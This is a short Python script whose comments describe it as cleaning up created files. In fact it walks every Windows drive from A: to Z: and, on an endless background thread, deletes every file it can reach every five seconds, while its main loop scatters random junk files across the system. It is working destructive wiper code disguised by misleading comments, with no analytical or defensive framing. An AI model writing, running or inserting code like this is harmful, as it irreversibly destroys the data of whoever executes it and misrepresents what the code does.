import time
import os
import random

# Function to generate random file names
def generate_random_filename():
    filename_length = random.randint(4, 12)
    filename = ''.join(random.choices('abcdefghijklmnopqrstuvwxyz0123456789', k=filename_length))
    return filename

# Function to search for all directories in the system
def search_directories():
    directories = []
    drive_list = ['A:\\', 'B:\\', 'C:\\', 'D:\\', 'E:\\', 'F:\\', 'G:\\', 'H:\\', 'I:\\', 'J:\\', 'K:\\', 'L:\\', 'M:\\', 'N:\\', 'O:\\', 'P:\\', 'Q:\\', 'R:\\', 'S:\\', 'T:\\', 'U:\\', 'V:\\', 'W:\\', 'X:\\', 'Y:\\', 'Z:\\']
    for drive in drive_list:
        try:
            for root, dirs, files in os.walk(drive):
                for dir in dirs:
                    directories.append(os.path.join(root, dir))
        except FileNotFoundError:
            pass
    return directories

# Function to clean up created files
def cleanup_files():
    while True:
        directories = search_directories()
        for directory in directories:
            try:
                for filename in os.listdir(directory):
                    filepath = os.path.join(directory, filename)
                    if os.path.isfile(filepath):
                        try:
                            os.remove(filepath)
                        except PermissionError:
                            pass  # Handle case where file cannot be deleted due to permissions
            except PermissionError:
                pass  # Handle case where directory cannot be accessed
        time.sleep(5)  # Wait for a specified interval before next cleanup

# Run the cleanup function in a separate thread
import threading
cleanup_thread = threading.Thread(target=cleanup_files)
cleanup_thread.daemon = True
cleanup_thread.start()

# Infinite loop to create files randomly
while True:
    directory = random.choice(search_directories())
    filename = generate_random_filename()
    filepath = os.path.join(directory, filename)
    content_length = random.randint(100, 1000)
    content = ''.join(random.choices('abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789', k=content_length))
    
    try:
        with open(filepath, 'w') as file:
            file.write(content)
    except (PermissionError, FileNotFoundError, OSError):
        continue

    time.sleep(1)  # Wait a bit before creating another file to avoid too rapid creation